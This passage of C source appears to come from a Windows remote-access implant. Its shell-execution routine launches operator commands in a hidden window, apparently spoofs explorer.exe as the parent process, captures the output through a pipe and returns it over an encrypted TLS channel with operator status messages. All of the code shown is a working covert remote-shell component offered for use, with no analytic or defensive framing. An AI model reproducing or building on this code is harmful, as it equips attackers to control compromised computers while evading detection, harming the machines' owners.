    DWORD createFlags = CREATE_NO_WINDOW |
                        (useAttr ? EXTENDED_STARTUPINFO_PRESENT : 0);

    BOOL ok = CreateProcessA(NULL, fullCmd, NULL, NULL, TRUE,
                              createFlags, NULL, NULL,
                              (LPSTARTUPINFOA)&sie, &pi);

    if (sie.lpAttributeList) {
        DeleteProcThreadAttributeList(sie.lpAttributeList);
        free(sie.lpAttributeList);
    }
    if (hExplorer) CloseHandle(hExplorer);
    CloseHandle(hWritePipe);   /* close our copy — child exit triggers EOF */
    free(fullCmd);

    if (!ok) {
        CloseHandle(hReadPipe);
        _send_str(pTls, "[-] _shell_exec: CreateProcess failed");
        return;
    }
    CloseHandle(pi.hThread);

    /* ── Read output ─────────────────────────────────────────────────── */
    size_t bufSize = SHELL_RESP_BUF;
    char  *resp    = (char *)calloc(1, bufSize);
    if (!resp) {
        k32_TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(hReadPipe);
        _send_str(pTls, "[-] out of memory");
        return;
    }

    size_t used = 0;
    char   chunk[4096];
    DWORD  nRead = 0;
    while (ReadFile(hReadPipe, chunk, sizeof(chunk), &nRead, NULL) && nRead > 0) {
        if (used + nRead + 1 >= bufSize) {
            /* Cap growth at JOB_BUF_LIMIT to prevent unbounded heap growth */
            if (bufSize >= JOB_BUF_LIMIT) break;
            size_t newSz = (bufSize * 2 < JOB_BUF_LIMIT) ? bufSize * 2 : JOB_BUF_LIMIT;
            char  *p     = (char *)realloc(resp, newSz);
            if (!p) break;
            resp    = p;
            bufSize = newSz;
        }
        if (used + nRead < bufSize) {
            memcpy(resp + used, chunk, nRead);
            used += nRead;
        }
    }
    resp[used] = '\0';

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(hReadPipe);

    if (g_cs_init) EnterCriticalSection(&g_tls_cs);
    tls_send_msg(pTls, (const BYTE *)(used ? resp : " "), (DWORD)(used ? used : 1));
    if (g_cs_init) LeaveCriticalSection(&g_tls_cs);
    free(resp);
}
